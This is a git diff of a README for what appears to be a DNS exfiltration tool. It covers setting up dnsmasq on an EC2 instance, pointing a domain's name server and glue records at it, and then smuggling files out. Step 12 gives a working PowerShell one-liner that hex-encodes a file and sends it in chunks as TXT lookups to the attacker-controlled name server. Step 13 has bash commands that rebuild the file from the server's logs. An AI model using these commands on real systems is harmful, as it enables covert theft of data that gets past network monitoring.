@@ -25,7 +25,9 @@ Restart the VM, or find a way to restart dnsmasq (sudo systemctl restart systemd
 
 sudo dnsmasq  
 
-## Step 5: Go to Route 53 config, note down default SOA and NS records
+## Step 5: Go to Route 53 config, note down default SOA and NS records  
+  
+![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/3291d850-0692-4017-9cd0-398aa51e97ea)
 
 
 ## Step 6: Create A Record to point from record name to your EC2 instance
@@ -64,20 +66,27 @@ Note down the current name server settings before making any modifications
 ![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/35cf3290-b494-45de-9752-fea7e57e7f91)
 
 
-## Step 9: Use CMD to nslookup as a test
+Once current settings noted down, change it to point to your own DNS server then Save.  
+**Name Server:** ns1.<yourdomain.com>  
+**Glue Records:** <your EC2 public IP address>  
+  
+![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/90d99de8-7099-4c4c-be81-5d9a8b68df3e)
+  
+
+## Step 10: Use CMD to nslookup as a test
 nslookup -q=TXT 12332145343dafdsa234234123123453asdf234sadfsadfasdf ns1.<yourdomain.com>  
 
 
-## Step 10: Check your DNS logs in EC2
+## Step 11: Check your DNS logs in EC2
 sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"  
 
 
-## Step 11: Powershell command to hex encode a file, split, and do nslookup
+## Step 12: Powershell command to hex encode a file, split, and do nslookup
 
 `certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.<yourdomain.com>" ns1.<yourdomain.com>; sleep 5} `
 
 
-## Step 12: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
+## Step 13: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
 
 `sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
 `sudo cat output | xxd -p -r > ToExfil.txt | cat ToExfil.txt`  
